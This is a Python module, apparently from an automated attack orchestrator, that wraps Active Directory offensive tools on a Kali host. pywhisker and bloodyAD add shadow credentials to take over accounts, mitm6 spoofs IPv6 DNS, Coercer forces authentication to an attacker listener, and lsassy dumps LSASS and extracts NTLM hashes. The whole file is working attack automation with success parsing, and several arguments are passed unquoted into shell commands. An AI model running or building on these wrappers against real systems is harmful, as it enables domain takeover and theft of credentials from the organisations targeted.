import re, logging, shlex

from orchestrator.kali_tools_client import kali

logger = logging.getLogger("ad_pywhisker")


class PywhiskerWrapper:
    async def add_keycredential(self, target: str, username: str, password: str = "",
                                 hash: str = "", domain: str = "",
                                 dc_ip: str = "", target_user: str = "",
                                 timeout: int = 120) -> dict:
        args = f"-d {shlex.quote(domain)} -u {shlex.quote(username)}"
        args += f" -p {shlex.quote(password)}" if password else f" -H {shlex.quote(hash)}"
        args += f" --target {shlex.quote(target_user or target)}"
        args += f" --dc-ip {shlex.quote(dc_ip or target)}"
        args += " --action add"
        result = await kali.run("pywhisker", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        pfx_match = re.search(r"Saved PFX #\d+ at\s+(\S+\.pfx)", stdout)
        return {
            "success": pfx_match is not None,
            "pfx_path": pfx_match.group(1) if pfx_match else None,
            "raw": stdout[:3000],
        }

    async def list_keycredentials(self, target: str, username: str, password: str = "",
                                   hash: str = "", domain: str = "",
                                   dc_ip: str = "", target_user: str = "",
                                   timeout: int = 120) -> dict:
        args = f"-d {shlex.quote(domain)} -u {shlex.quote(username)}"
        args += f" -p {shlex.quote(password)}" if password else f" -H {shlex.quote(hash)}"
        args += f" --target {shlex.quote(target_user or target)}"
        args += f" --dc-ip {shlex.quote(dc_ip or target)}"
        args += " --action list"
        result = await kali.run("pywhisker", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        device_ids = re.findall(r"DeviceID:\s*(\S+)", stdout)
        return {
            "success": len(device_ids) > 0,
            "device_ids": device_ids,
            "raw": stdout[:3000],
        }


class BloodyadWrapper:
    async def shadow_creds(self, target: str, username: str, password: str = "",
                            hash: str = "", domain: str = "",
                            target_user: str = "", timeout: int = 120) -> dict:
        args = f"--dc-ip {shlex.quote(target)} --target {shlex.quote(target_user or target)}"
        args += f" -u {shlex.quote(username)}"
        args += f" -p {shlex.quote(password)}" if password else f" -H {shlex.quote(hash)}"
        if domain:
            args += f" -d {domain}"
        args += " shadowcreds"
        result = await kali.run("bloodyad", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        success = "successfully" in stdout.lower() or "added" in stdout.lower()
        return {
            "success": success,
            "raw": stdout[:3000],
        }


class Mitm6Wrapper:
    async def start(self, domain: str, interface: str = "eth0",
                     timeout: int = 60) -> dict:
        args = f"-d {domain} -i {interface} -6"
        result = await kali.run("mitm6", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        return {
            "success": True,
            "raw": stdout[:3000],
        }


class CoercerWrapper:
    async def coerce(self, target: str, listener: str,
                      username: str = "", password: str = "",
                      hash: str = "", domain: str = "",
                      timeout: int = 120) -> dict:
        args = f"coerce -t {shlex.quote(target)} -l {shlex.quote(listener)}"
        if username:
            args += f" -u {shlex.quote(username)}"
        if password:
            args += f" -p {shlex.quote(password)}"
        if hash:
            args += f" -H {hash}"
        if domain:
            args += f" -d {domain}"
        result = await kali.run("coercer", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        success = "captured" in stdout.lower() or "coerced" in stdout.lower()
        return {
            "success": success,
            "raw": stdout[:3000],
        }


class LsassyWrapper:
    async def dump(self, target: str, username: str = "", password: str = "",
                    hash: str = "", timeout: int = 120) -> dict:
        args = f"{shlex.quote(target)}"
        if username:
            args += f" -u {shlex.quote(username)}"
        if password:
            args += f" -p {shlex.quote(password)}"
        if hash:
            args += f" -H {hash}"
        result = await kali.run("lsassy", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        hashes = re.findall(r'(\w+:\d+:\w{32}:\w{32})', stdout)
        return {
            "success": len(hashes) > 0,
            "hashes": hashes,
            "count": len(hashes),
            "raw": stdout[:3000],
        }
